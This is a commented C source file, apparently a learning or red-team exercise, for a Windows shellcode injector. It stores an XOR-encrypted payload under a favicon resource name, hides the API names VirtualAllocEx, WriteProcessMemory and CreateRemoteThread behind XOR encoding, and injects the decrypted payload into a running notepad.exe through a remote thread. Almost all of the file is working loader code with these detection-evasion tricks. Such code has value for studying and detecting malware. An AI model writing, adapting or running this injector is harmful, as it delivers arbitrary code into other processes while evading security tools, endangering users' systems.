/*
* This program demonstrates shellcode injection into a target process.
*
* Steps:
*  - The shellcode (in this example, it could be a payload like launching calc.exe)
*    is embedded in the application’s resources (.rsrc section).
*  - The shellcode is encrypted using XOR with a simple key.
*  - At runtime, the shellcode is extracted and decrypted.
*  - The decrypted shellcode is injected into a target process (e.g., notepad.exe)
*    by allocating memory in the target process, writing the shellcode there,
*    and creating a remote thread that executes it.
*  - The use of WinMain hides the console window 

*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <memoryapi.h>
#include <tlhelp32.h>
#include "resources.h"  // Ensure FAVICON_ICO is defined appropriately
#pragma comment(lib, "user32.lib")

// Function pointers for API functions resolved at runtime.
typedef LPVOID (__stdcall *VirtualAllocEx_t)( // LPVOID: return type(pointer to the allocated memory), 
    HANDLE hProcess, // handle to the target process
    LPVOID lpAddress, // base address
    SIZE_T dwSize, // size of the allocation memory
    DWORD flAllocationType, // flags
    DWORD flProtect // mem protection constants
);

BOOL (WINAPI * pWriteProcessMemory)( //true or false
    HANDLE hProcess,  // handle to the target process
    LPVOID lpBaseAddress, // address in the remote process where data will be written
    LPCVOID lpBuffer, // pointer to the buffer contraining the data
    SIZE_T nSize, // number of bytes to write
    SIZE_T *lpNumberOfBytesWritten // pointer to a variable that receices the number of bytes actually written
);

HANDLE (WINAPI * pCreateRemoteThread)( // return handle to the newly created remote thread
    HANDLE hProcess,  // handle to the target process
    LPSECURITY_ATTRIBUTES lpThreadAttributes, // pointer to security attributes 
    SIZE_T dwStackSize, // initial size of the stack for the new thread
    LPTHREAD_START_ROUTINE lpStartAddress, // shellcode that the remote thread will execute
    LPVOID lpParameter, // pointer to a variable to pass to the enw thraad
    DWORD dwCreationFlags, // flag (0 for immediate execution)
    LPDWORD lpThreadId // pointer to a variable that receives the new threads ID
);

// Define the XOR key (note: sizeof(key) includes the null terminator, so effective length is one less).
char key[] = "mysecretkeee";

// Revised XOR function using modulo arithmetic so that the full key (minus the null) is used.
void XOR(char * data, size_t data_len, char * key, size_t key_len) {
    size_t effective_key_len = key_len - 1; // exclude null terminator
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % effective_key_len];
    }
}

// Find the target process (e.g., "notepad.exe") by name (Unicode).
int FindTarget(const wchar_t* procname) {
    wprintf(L"Looking for process: %ls\n", procname);
    // Create a snapshot of all running processes
    HANDLE hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcSnap == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    int pid = 0;
    wprintf(L"Listing all running processes:\n");
    // Loop through all processes in the snapshot
    do {
        // Print the process name and its PID
        wprintf(L"Process: %ls (PID: %d)\n", pe32.szExeFile, pe32.th32ProcessID);
        // If the process name matches, store its PID.
        if (pid == 0 && lstrcmpiW(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
        }
    } while (Process32NextW(hProcSnap, &pe32));

    CloseHandle(hProcSnap);
    return pid;
}


// Function to inject the shellcode into a target process.
int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) { // handle to the target proc, pointer to shellcode, size of the shellcode
    LPVOID pRemoteCode = NULL; // pointer to shellcode
    HANDLE hThread = NULL; // stores handle to a newly create remote trhead

    // Encrypted API function names.
    unsigned char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1, 0x00 };
    unsigned char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8, 0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb, 0x00 };
    unsigned char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6, 0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16, 0x00};

    // Decrypt function names.
    XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx) - 1, key, sizeof(key));
    XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory) - 1, key, sizeof(key));
    XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread) - 1, key, sizeof(key));

    // Print the decrypted names for debugging:
    printf("Decrypted VirtualAllocEx: %s\n", sVirtualAllocEx);
    printf("Decrypted WriteProcessMemory: %s\n", sWriteProcessMemory);
    printf("Decrypted CreateRemoteThread: %s\n", sCreateRemoteThread);

        

    // Resolve the API addresses.
    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sVirtualAllocEx); // dynamically resolves the address of VirtualAllocEx from kernel32.dll 
    // this casts the result of getprocaddress to a function pointer with the same signature as VirtualAllocEx
    pWriteProcessMemory = (BOOL (WINAPI *)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *))
        GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sWriteProcessMemory);
    pCreateRemoteThread = (HANDLE (WINAPI *)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))
        GetProcAddress(GetModuleHandle(L"kernel32.dll"), (LPCSTR)sCreateRemoteThread);

    HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32.dll"));
    if (hKernel32 == NULL) {
        printf("Failed to get module handle for kernel32.dll\n");
    }    
    if (!pVirtualAllocEx) {
        printf("VirtualAllocEx not found. Error: %lu\n", GetLastError());
    }
    if (!pWriteProcessMemory) {
        printf("WriteProcessMemory not found. Error: %lu\n", GetLastError());
    }
    if (!pCreateRemoteThread) {
        printf("CreateRemoteThread not found. Error: %lu\n", GetLastError());
    }
    

    // Allocate memory in the target process.
    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pRemoteCode) {
        printf(" Failed to allocate memory in the target process.\n");
        return -1;
    }

    // Write the shellcode to the allocated memory.
    if (!pWriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL)) {
        MessageBox(NULL, TEXT("Failed to write to target process memory."), TEXT("Error"), MB_OK);
        return -1;
    }

    // Create a remote thread to execute the shellcode.
    hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (!hThread) {
        MessageBox(NULL, TEXT("Failed to create remote thread."), TEXT("Error"), MB_OK);
        return -1;
    }

    // Optionally wait for the thread to execute.
    WaitForSingleObject(hThread, 500);
    CloseHandle(hThread);

    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    // hInstance : handle of the current instance of the application
    // hPrevInstance : handle to the previous instance of the application
    // lpcomdLine : command line for the application


    // Allocate and attach a console so printf output is visible.
    AllocConsole();
    freopen("CONOUT$", "w", stdout); //console output
    


    void * exec_mem; // pointer to variable that old memory address
    HGLOBAL resHandle = NULL; // handle to a global memory object
    HRSRC res; //resources handles(icons, strings...)
    unsigned char *payload; // pointer to an array of unsigned bytes
    unsigned int payload_len; // variable store len of the payload
    int pid = 0; // variable store process id 
    HANDLE hProc = NULL; // store a handle to a process

    printf("Press Enter to start resource extraction...\n");
    getchar();

    // winapi functions that load the shellcode payload from the resource inside the executable.
    res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA); // null, convert an integer resource id(favicon_ico), RT_RCDATA: resource is raw binary data
    if (!res) {
        MessageBox(NULL, L"Resource not found!", L"Error", MB_OK);
        return -1;
    }

    // loads a specified resource into memory
    resHandle = LoadResource(NULL, res); // null: rsrc loaded from the current exe, res: handle to the resource found using FindResource
    if (!resHandle) {
        MessageBox(NULL, L"Failed to load resource.", L"Error", MB_OK);
        return -1;
    }


    // extract the content of resource and store in pointer payload
    payload = (unsigned char *) LockResource(resHandle); // cast the returned pointer to an (unsiged char *) to treating the rsrc data as raw binary, LockResource retrieves a pointer to the actual raw data of a previously loaded resource, resHandle: handle to the resource from loadresource
    
    //determine size of the resource data
    payload_len = SizeofResource(NULL, res); // SizeofResource: retrieves size in bytes of a resource, NULL: resource retrieve from the current executable, res: handle to the resource obtained from findresource

    if (!payload || payload_len == 0) {
        MessageBox(NULL, L"Failed to lock resource or resource size is zero.", L"Error", MB_OK);
        return -1;
    }

    printf("Resource loaded successfully.\n");
    printf("Payload address: 0x%p, Length: %u bytes\n", payload, payload_len);
    printf("Press Enter to allocate memory and copy payload...\n");
    getchar();

    // Allocate memory for the payload.
    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) { 
        MessageBox(NULL, TEXT("Local memory allocation failed."), TEXT("Error"), MB_OK);
        return -1;
    }
    
    printf("Allocated executable memory at: 0x%p\n", exec_mem);

    // copies memory from one location to another
    RtlMoveMemory(exec_mem, payload, payload_len); // exec_mem: buffer previously allocated, payload: source buffer containing raw binary data, payload_len: number of bytes to copy 

    // decrypt
    XOR((char *) exec_mem, payload_len, key, sizeof(key));

    printf("Payload copied and decrypted.\n");
    printf("Press Enter to attempt injection...\n");
    getchar();
    

    // Find the target process ("notepad.exe")
    pid = FindTarget(L"Notepad.exe"); // searches for a process name and returns its PID
    if (!pid) {
        MessageBox(NULL, TEXT("Target process (notepad.exe) not found. Please run it and try again."), TEXT("Error"), MB_OK);
        return -1;
    }

    printf("Found notepad.exe with PID = %d\n", pid);

    // Open a handle to a running process
    hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | // PCT: allows creating thread into target process, PQI: allows retrieve info about process
                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, // PVO: allows modifying the mem of the proc, PVR: allow reading memory from the process, PVW: allows writing memory to the process
                        FALSE, (DWORD)pid); // false: handle inheritance is disabled, pid obtained earlier using findtarget
    if (!hProc) {
        MessageBox(NULL, TEXT("Failed to open target process."), TEXT("Error"), MB_OK);
        return -1;
    }
    printf("Opened target process handle: 0x%p\n", hProc);
    getchar();

    // Inject the shellcode.
    if (Inject(hProc, (unsigned char *) exec_mem, payload_len) == 0) { //hproc: handle to the target process previously opened with openprocess, a pointer to the shellcode stored in executable memory
        printf("Injection succeeded.\n");
    } else {
        printf("Injection failed.\n");
    }
    CloseHandle(hProc);

    printf("Press Enter to exit...\n");
    getchar();

    return 0;
}
